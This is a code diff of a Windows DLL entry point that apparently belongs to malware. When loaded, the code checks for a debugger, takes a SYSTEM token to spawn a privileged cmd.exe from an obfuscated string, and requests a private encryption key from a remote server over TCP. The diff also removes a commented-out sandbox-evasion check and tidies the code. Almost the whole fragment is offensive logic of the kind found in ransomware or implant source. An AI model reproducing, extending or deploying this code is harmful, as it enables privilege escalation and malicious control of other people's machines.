@@ -1,8 +1,8 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
-#include "procmgr.h"
-#include "syscalls.h"
-#include "client.h"
-#include "net_common.h"
+#include "ProcessManager.h"
+#include "Syscalls.h"
+#include "Client.h"
+#include "NetworkCommon.h"
 
 #include <thread>
 
@@ -38,15 +38,9 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		ProcessManager mgr;
 		mgr.CheckNoDebugger();
 
-		//if ( SandboxCompromise::SuspicousProcRunning() )
-		//	ProcessManager::HaltProcessExecution();
-
 		HANDLE escalatedPriv = mgr.GetSystemToken();
 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
 		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
-		
-		std::vector<wchar_t> cmd(wstrCmd.begin(), wstrCmd.end());
-		cmd.push_back(L'\0');
 		 
 		STARTUPINFO si = { 0 };
 		PROCESS_INFORMATION pi;
@@ -57,15 +51,13 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 			token,
 			LOGON_WITH_PROFILE,
 			NULL,
-			cmd.data(),
+			wstrCmd.data(),
 			CREATE_NEW_CONSOLE,
 			NULL,
 			NULL,
 			&si,
 			&pi
 		);
-
-		OutputDebugStringA("yes");
 
 		Client me;
 
@@ -75,12 +67,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 		ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
 		me.MakeTCPRequest(req, TRUE);
-
-		while ( 1 ) {
-			std::this_thread::sleep_for(std::chrono::seconds(1));
-		}
-
-		//// query mac addresses
+		me.Disconnect();
 
 		break;
 	}
